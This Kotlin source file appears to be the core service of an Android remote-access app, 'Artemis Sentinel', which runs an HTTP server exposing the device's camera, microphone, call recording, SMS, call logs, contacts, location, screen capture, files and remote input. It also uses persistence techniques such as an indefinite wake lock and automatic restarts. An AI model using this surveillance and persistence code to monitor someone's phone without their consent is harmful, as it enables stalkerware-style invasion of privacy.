package com.example.artemis.service

import android.app.Notification
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.lifecycle.LifecycleService
import com.example.artemis.ArtemisApp
import com.example.artemis.auth.AuthManager
import com.example.artemis.data.AppDatabase
import com.example.artemis.receiver.DozeRecoveryReceiver
import com.example.artemis.feature.CallLogsProvider
import com.example.artemis.feature.CallRecorder
import com.example.artemis.feature.CameraController
import com.example.artemis.feature.CameraFeedController
import com.example.artemis.feature.BatteryHelper
import com.example.artemis.feature.ContactsProvider
import com.example.artemis.feature.DeviceInfoProvider
import com.example.artemis.feature.FileSystemHelper
import com.example.artemis.feature.LocationTracker
import com.example.artemis.feature.MicController
import com.example.artemis.feature.RemoteInputController
import com.example.artemis.feature.ScreenCaptureController
import com.example.artemis.feature.SmsProvider
import com.example.artemis.feature.TripleRecorder
import com.example.artemis.feature.VideoRecorder
import com.example.artemis.server.SimpleHttpServer
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class ArtemisSentinelService : LifecycleService() {

    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private lateinit var app: ArtemisApp
    private lateinit var authManager: AuthManager
    private lateinit var database: AppDatabase
    private lateinit var deviceInfoProvider: DeviceInfoProvider
    private lateinit var locationTracker: LocationTracker
    private lateinit var cameraController: CameraController
    private lateinit var micController: MicController
    private lateinit var callLogsProvider: CallLogsProvider
    private lateinit var smsProvider: SmsProvider
    private lateinit var callRecorder: CallRecorder
    private lateinit var videoRecorder: VideoRecorder
    private lateinit var cameraFeedController: CameraFeedController
    private lateinit var contactsProvider: ContactsProvider
    private lateinit var fileSystemHelper: FileSystemHelper
    private lateinit var remoteInputController: RemoteInputController
    private lateinit var tripleRecorder: TripleRecorder
    private lateinit var artemisServer: SimpleHttpServer

    private var wakeLock: PowerManager.WakeLock? = null
    private var isRunning = false

    // Doze-exit re-arm: registered DYNAMICALLY while the service runs.
    // A manifest-declared receiver for USER_PRESENT / SCREEN_ON cannot run
    // on Android 12+ when the app is in the background ("Background
    // execution not allowed" — seen live). The FGS keeps this process
    // alive, so a dynamic registration receives those broadcasts.
    private var dozeRecoveryReceiver: DozeRecoveryReceiver? = null

    companion object {
        const val NOTIFICATION_ID = 1001
        const val ACTION_START = "com.example.artemis.action.START"
        const val ACTION_STOP = "com.example.artemis.action.STOP"
        const val ACTION_RESTART = "com.example.artemis.action.RESTART"

        fun start(context: Context) {
            val intent = Intent(context, ArtemisSentinelService::class.java).apply {
                action = ACTION_START
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, ArtemisSentinelService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
    }

    override fun onCreate() {
        super.onCreate()
        app = ArtemisApp.instance
        authManager = AuthManager(app)
        database = AppDatabase.getInstance(this)
        deviceInfoProvider = DeviceInfoProvider(this)
        locationTracker = LocationTracker(this, database)
        cameraController = CameraController(this, this)
        micController = MicController(this)
        callLogsProvider = CallLogsProvider(this)
        smsProvider = SmsProvider(this)
        callRecorder = CallRecorder(this)
        videoRecorder = VideoRecorder(this, this)
        cameraFeedController = CameraFeedController(this, cameraController)
        contactsProvider = ContactsProvider(this)
        fileSystemHelper = FileSystemHelper(this)
        remoteInputController = RemoteInputController(this)
        tripleRecorder = TripleRecorder(this, this, cameraController)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // LifecycleService drives the lifecycle from onStartCommand — MUST
        // call super so the camera (bound to this service's lifecycle)
        // reaches STARTED before any capture is attempted.
        super.onStartCommand(intent, flags, startId)
        when (intent?.action) {
            ACTION_START -> startServer()
            ACTION_STOP -> stopServer()
            // onTaskRemoved sends this while the foreground service is
            // normally still alive.  Stopping and immediately recreating the
            // socket races the asynchronous close and can produce an
            // "address already in use" failure.  START_STICKY creates a
            // fresh service after a real process death, where isRunning is
            // false and this starts it again.
            ACTION_RESTART -> if (!isRunning) startServer()
            else -> {
                if (!isRunning) startServer()
            }
        }
        return START_STICKY
    }

    private fun startServer() {
        if (isRunning) return
        isRunning = true

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                // Android 14+: explicitly specify FGS types to avoid the system
                // pulling ALL manifest-declared types (which may include types
                // whose permissions aren't granted on every OEM).
                startForeground(
                    NOTIFICATION_ID, createNotification(0),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                            or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                )
            } else {
                startForeground(NOTIFICATION_ID, createNotification(0))
            }
        } catch (e: Exception) {
            android.util.Log.e("ArtemisSvc", "startForeground failed: ${e.message}", e)
            isRunning = false
            stopSelf()
            return
        }
        acquireWakeLock()
        registerDozeRecovery()

        artemisServer = SimpleHttpServer(
            app = app,
            authManager = authManager,
            deviceInfoProvider = deviceInfoProvider,
            locationTracker = locationTracker,
            cameraController = cameraController,
            micController = micController,
            callLogsProvider = callLogsProvider,
            smsProvider = smsProvider,
            callRecorder = callRecorder,
            videoRecorder = videoRecorder,
            cameraFeedController = cameraFeedController,
            screenCaptureController = ScreenCaptureController.get(this),
            fileSystemHelper = fileSystemHelper,
            contactsProvider = contactsProvider,
            batteryHelper = BatteryHelper(this),
            remoteInputController = remoteInputController,
            tripleRecorder = tripleRecorder
        )

        serviceScope.launch {
            try {
                android.util.Log.i("ArtemisSvc", "Starting ArtemisServer...")
                artemisServer.start()
                app.serverRef = artemisServer
                app.serverStartedAt = artemisServer.startTime
                android.util.Log.i("ArtemisSvc", "ArtemisServer started, starting location tracking...")
                startLocationTracking()
                android.util.Log.i("ArtemisSvc", "Starting call recorder listener...")
                callRecorder.startListening()
                android.util.Log.i("ArtemisSvc", "Scheduling health check...")
                scheduleHealthCheck()
                android.util.Log.i("ArtemisSvc", "Updating notification...")
                updateNotification(0)
                android.util.Log.i("ArtemisSvc", "Server startup complete.")
            } catch (e: Exception) {
                android.util.Log.e("ArtemisSvc", "Server start FAILED: ${e.message}", e)
                app.serverRef = null
                stopSelf()
            }
        }
    }

    private fun stopServer() {
        isRunning = false
        unregisterDozeRecovery()
        serviceScope.launch {
            try {
                artemisServer.stop()
            } catch (_: Exception) { }
            app.serverRef = null
            locationTracker.stopLocationUpdates()
            micController.release()
            callRecorder.release()
            videoRecorder.release()
            cameraFeedController.release()
            ScreenCaptureController.get(this@ArtemisSentinelService).stop()
            releaseWakeLock()
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    private fun startLocationTracking() {
        locationTracker.startLocationUpdates()
    }

    private fun scheduleHealthCheck() {
        val healthCheckRequest = PeriodicWorkRequestBuilder<HealthCheckWorker>(
            15, TimeUnit.MINUTES
        ).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "artemis_health_check",
            ExistingPeriodicWorkPolicy.KEEP,
            healthCheckRequest
        )
    }

    private fun createNotification(activeClients: Int): Notification {
        val deviceName = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
        val uptimeSec = ((System.currentTimeMillis() - app.serverStartedAt) / 1000)
        val uptime = if (app.serverStartedAt > 0 && uptimeSec >= 0) {
            val h = uptimeSec / 3600
            val m = (uptimeSec % 3600) / 60
            val s = uptimeSec % 60
            "${h}h ${m}m ${s}s"
        } else {
            "starting…"
        }
        val contentText = if (activeClients > 0) {
            "$deviceName — $activeClients connected · up $uptime"
        } else {
            "$deviceName — up $uptime"
        }
        return NotificationCompat.Builder(this, ArtemisApp.CHANNEL_SERVICE)
            .setContentTitle("Artemis Sentinel v2.3.3 Active")
            .setContentText(contentText)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setShowWhen(false)
            .build()
    }

    private fun updateNotification(activeClients: Int) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, createNotification(activeClients))
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "ArtemisSentinel:ServerWakeLock"
            )
            // Indefinite while the service runs (24/7 persistence). The old
            // 4 h cap let the CPU sleep and Doze kill the server socket.
            wakeLock?.acquire()
        } catch (_: Exception) { }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) it.release()
            }
        } catch (_: Exception) { }
        wakeLock = null
    }

    /** Dynamically register the Doze-exit re-arm receiver (see field note). */
    private fun registerDozeRecovery() {
        try {
            if (dozeRecoveryReceiver != null) return
            val receiver = DozeRecoveryReceiver()
            dozeRecoveryReceiver = receiver
            val filter = android.content.IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_USER_PRESENT)
                addAction(Intent.ACTION_POWER_CONNECTED)
                addAction(Intent.ACTION_POWER_DISCONNECTED)
                addAction(android.net.ConnectivityManager.CONNECTIVITY_ACTION)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                @Suppress("DEPRECATION")
                registerReceiver(receiver, filter)
            }
            receiver.onRegistered()
            android.util.Log.i("ArtemisSvc", "DozeRecovery receiver registered")
        } catch (e: Exception) {
            android.util.Log.w("ArtemisSvc", "DozeRecovery register failed: ${e.message}")
        }
    }

    private fun unregisterDozeRecovery() {
        try {
            dozeRecoveryReceiver?.let { unregisterReceiver(it) }
        } catch (_: Exception) { }
        dozeRecoveryReceiver = null
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // User swiped the app from recents. With stopWithTask=false and
        // START_STICKY the service normally survives; Samsung's task killer
        // can drop the process anyway, so re-arm explicitly. If the system
        // blocks the background start (Android 12+), START_STICKY will
        // restart the service with a null intent on the next opportunity —
        // the null-intent branch of onStartCommand restarts the server.
        android.util.Log.i("ArtemisSvc", "Task removed — re-arming service")
        try {
            val restart = Intent(this, ArtemisSentinelService::class.java).apply {
                action = ACTION_RESTART
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restart)
            } else {
                startService(restart)
            }
        } catch (e: Exception) {
            android.util.Log.w("ArtemisSvc", "Background restart blocked (${e.message}) — START_STICKY will re-arm")
        }
    }

    override fun onDestroy() {
        isRunning = false
        app.serverRef = null
        unregisterDozeRecovery()
        // Stop any in-flight triple recording cleanly (finalizes MP4s).
        try { tripleRecorder.release() } catch (_: Exception) { }
        // IMPORTANT: close the socket properly. Without this, the bound
        // ServerSocket leaks — TCP still shows LISTEN but the accept loop
        // is cancelled and the wake lock is released, i.e. a zombie socket
        // that never answers (and Doze freezes it). START_STICKY then
        // re-creates the service on the next opportunity; a stale socket
        // would make the restart fail with "address already in use".
        try {
            kotlinx.coroutines.runBlocking { artemisServer.stop() }
        } catch (_: Exception) { }
        serviceScope.cancel()
        releaseWakeLock()
        super.onDestroy()
    }
}
